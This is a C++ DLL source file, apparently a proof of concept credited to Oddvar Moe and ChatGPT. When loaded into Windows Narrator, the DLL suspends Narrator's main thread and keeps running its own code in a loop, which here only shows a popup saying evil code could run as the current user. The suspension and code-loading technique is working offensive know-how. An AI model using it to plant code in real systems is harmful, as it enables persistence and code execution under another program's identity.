// dllmain.cpp : Defines the entry point for the DLL application.
// Just an example on how to suspend narrator execution and continue to execute code in this dll
// Author: Oddvar Moe & ChatGPT

#pragma once
#include "pch.h"
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <string>
#include <vector>
#include <functional>
#include <stdio.h>
#include <lmcons.h>
#include <sddl.h>

std::wstring GetCurrentUser() {
    WCHAR username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;

    if (GetUserNameW(username, &username_len)) {
        return std::wstring(username);
    }
    return L"Unknown";
}

bool SuspendThreadById(DWORD tid)
{
    // Request suspend/resume rights on the thread
    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, tid);
    if (!hThread) {
        printf("Failed to open thread %lu (error %lu)\n", tid, GetLastError());
        return false;
    }

    DWORD suspendCount = SuspendThread(hThread);
    if (suspendCount == (DWORD)-1) {
        printf("SuspendThread failed (error %lu)\n", GetLastError());
        CloseHandle(hThread);
        return false;
    }

    //printf("Thread %lu suspended (previous suspend count = %lu)\n", tid, suspendCount);
    MessageBox(NULL, L"Main Thread suspended!", L"Message", MB_OK);
    CloseHandle(hThread);
    return true;
}

bool ResumeThreadById(DWORD tid)
{
    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, tid);
    if (!hThread) return false;

    DWORD suspendCount = ResumeThread(hThread);
    CloseHandle(hThread);
    return suspendCount != (DWORD)-1;
}

inline uint64_t FileTimeToUint64(const FILETIME& ft) {
    ULARGE_INTEGER uli;
    uli.LowPart = ft.dwLowDateTime;
    uli.HighPart = ft.dwHighDateTime;
    return uli.QuadPart;
}

// Attempts to open a thread with minimal rights needed to query times.
inline HANDLE OpenThreadQueryOnly(DWORD tid) {
    // THREAD_QUERY_LIMITED_INFORMATION is supported on Vista+.
    HANDLE h = OpenThread(THREAD_QUERY_LIMITED_INFORMATION, FALSE, tid);
    if (!h) {
        // Fallback for older systems/permissions.
        h = OpenThread(THREAD_QUERY_INFORMATION, FALSE, tid);
    }
    return h;
}

// Heuristic 1: earliest creation time among threads in PID.
inline DWORD FindMainThreadIdByCreationTime(DWORD pid) {
    DWORD bestTid = 0;
    uint64_t bestCreate = ~0ULL; // max

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te = {};
    te.dwSize = sizeof(te);

    if (Thread32First(snapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThreadQueryOnly(te.th32ThreadID);
                if (hThread) {
                    FILETIME createTime, exitTime, kernelTime, userTime;
                    if (GetThreadTimes(hThread, &createTime, &exitTime, &kernelTime, &userTime)) {
                        uint64_t ct = FileTimeToUint64(createTime);
                        if (ct < bestCreate) {
                            bestCreate = ct;
                            bestTid = te.th32ThreadID;
                        }
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(snapshot, &te));
    }
    CloseHandle(snapshot);
    return bestTid; // 0 if not found
}

// Helper: enumerate top-level windows and locate the one belonging to PID.
inline HWND FindMainWindowForPid(DWORD pid) {
    struct Ctx { DWORD pid; HWND hwnd = nullptr; };
    Ctx ctx{ pid, nullptr };

    EnumWindows([](HWND hwnd, LPARAM lp) -> BOOL {
        auto& c = *reinterpret_cast<Ctx*>(lp);
        DWORD wpid = 0;
        GetWindowThreadProcessId(hwnd, &wpid);
        if (wpid == c.pid && GetWindow(hwnd, GW_OWNER) == nullptr && IsWindowVisible(hwnd)) {
            c.hwnd = hwnd;
            return FALSE; // stop
        }
        return TRUE; // continue
        }, reinterpret_cast<LPARAM>(&ctx));

    return ctx.hwnd;
}

// Heuristic 2: thread that owns the main window; fallback to earliest creation time.
inline DWORD FindLikelyMainThreadId(DWORD pid) {
    if (HWND mainHwnd = FindMainWindowForPid(pid)) {
        DWORD tid = GetWindowThreadProcessId(mainHwnd, nullptr);
        if (tid) return tid;
    }
    return FindMainThreadIdByCreationTime(pid);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {    // create a messagebox
        DWORD tid = FindLikelyMainThreadId(GetCurrentProcessId());
		SuspendThreadById(tid);
        //DWORD mainTid = FindLikelyMainThreadId(myPid);
        //MessageBox(NULL, std::to_wstring(tid).c_str(), L"DLL Message", MB_OK);
		DWORD pid = GetCurrentProcessId();
        //MessageBox(NULL, std::to_wstring(pid).c_str(), L"DLL Message", MB_OK);
        while (true) {
            
            std::wstring msg = L"Evil code could be running now as: " + GetCurrentUser() + L" instead of this popup!";
            MessageBoxW(NULL, msg.c_str(), L"DLL Message", MB_OK);
            // Sleep in the loop
            Sleep(20000);
        }
        break;
    }
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
